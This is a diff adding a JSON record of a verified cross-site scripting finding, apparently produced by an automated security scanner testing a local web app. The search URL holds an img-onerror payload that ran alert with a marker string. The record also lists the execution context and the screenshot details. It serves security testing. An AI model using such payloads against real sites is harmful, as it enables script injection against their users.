@@ -1,0 +1,27 @@
+{
+  "finding_id": "T-001",
+  "url": "http://127.0.0.1:3000/#/search?q=<img src=x onerror=alert('vrfff417e61'.concat('4391894e'))>",
+  "status": 200,
+  "marker": "vrfff417e614391894e",
+  "executed_via": [
+    "alert"
+  ],
+  "captured": "2026-11-12T12:43:23.175674Z",
+  "execution_contexts": [
+    {
+      "verified": true,
+      "origin": "http://127.0.0.1:3000",
+      "frame": "main",
+      "document": "/",
+      "attempt": "eebb5dc14e8af396b8910e47",
+      "is_marker": true
+    }
+  ],
+  "attempt": "eebb5dc14e8af396b8910e47",
+  "marked_elements": 1,
+  "hidden_for_screenshot": [
+    "div.cdk-overlay-container",
+    "div.cc-window.cc-floating"
+  ],
+  "credential_masked": false
+}
